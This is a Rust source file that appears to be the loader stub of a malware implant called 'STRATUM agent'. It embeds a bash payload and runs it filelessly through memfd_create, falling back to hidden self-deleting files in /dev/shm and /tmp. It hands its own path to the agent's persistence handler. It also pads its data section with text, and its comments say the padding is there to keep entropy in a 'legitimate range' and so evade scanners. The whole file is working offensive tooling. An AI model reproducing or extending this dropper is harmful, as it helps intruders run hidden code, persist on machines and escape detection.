// ELF entry: execute the embedded bash script with zero disk writes where possible.
// Execution chain: memfd_create (kernel 3.17+) → /dev/shm fallback → /tmp fallback.
// STUB_PATH is set to current_exe() so the agent's persist handler can copy the ELF binary.
use std::fs;
use std::io::Write;
use std::os::unix::fs::PermissionsExt;
use std::process::Command;

const SCRIPT: &[u8] = include_bytes!(env!("STRATUM_AGENT_PATH"));

// 128 KB of natural-language text placed directly in .rodata.
// Target: .rodata section entropy ≤ 5.5 b/B (legitimate range 4.0–5.5).
// Must use [u8; N] — &[u8] only moves the fat-pointer, not the payload bytes.
#[link_section = ".rodata"]
#[used]
static _PAD: [u8; 131072] = *include_bytes!(concat!(env!("OUT_DIR"), "/e.bin"));

fn main() {
    let _ = std::hint::black_box(_PAD.as_ptr());
    let exe = std::env::current_exe()
        .unwrap_or_default()
        .to_string_lossy()
        .into_owned();
    if !try_memfd(&exe) && !try_dir("/dev/shm", &exe) {
        try_dir("/tmp", &exe);
    }
}

// Truly fileless: write to an anonymous memory fd, exec bash from /proc/self/fd/<n>.
// The child inherits the fd and can read it via its own /proc/self/fd/<n>.
fn try_memfd(exe: &str) -> bool {
    use std::os::unix::io::{FromRawFd, IntoRawFd};

    let fd = unsafe {
        // SYS_memfd_create = 319 on x86_64 Linux
        libc::syscall(libc::SYS_memfd_create, b".\0".as_ptr(), 0u64) as i32
    };
    if fd < 0 {
        return false;
    }

    let written = {
        let mut f = unsafe { fs::File::from_raw_fd(fd) };
        let ok = f.write_all(SCRIPT).is_ok();
        f.into_raw_fd(); // keep fd open — child inherits it
        ok
    };
    if !written {
        unsafe { libc::close(fd) };
        return false;
    }

    let path = format!("/proc/self/fd/{}", fd);
    let ok = Command::new("bash")
        .arg(&path)
        .arg("-q")
        .env("STUB_PATH", exe)
        .spawn()
        .is_ok();
    unsafe { libc::close(fd) };
    ok
}

// Write to dir, exec bash, delete immediately after spawn (bash has already opened the file).
fn try_dir(dir: &str, exe: &str) -> bool {
    let path = format!("{}/.{}", dir, std::process::id());
    if fs::write(&path, SCRIPT).is_err() {
        return false;
    }
    let _ = fs::set_permissions(&path, fs::Permissions::from_mode(0o700));
    let ok = Command::new("bash")
        .arg(&path)
        .arg("-q")
        .env("STUB_PATH", exe)
        .spawn()
        .is_ok();
    let _ = fs::remove_file(&path);
    ok
}
